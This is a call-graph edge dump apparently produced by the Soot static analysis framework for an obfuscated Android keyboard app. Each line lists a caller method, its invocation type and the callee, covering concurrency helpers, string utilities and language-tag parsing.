SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
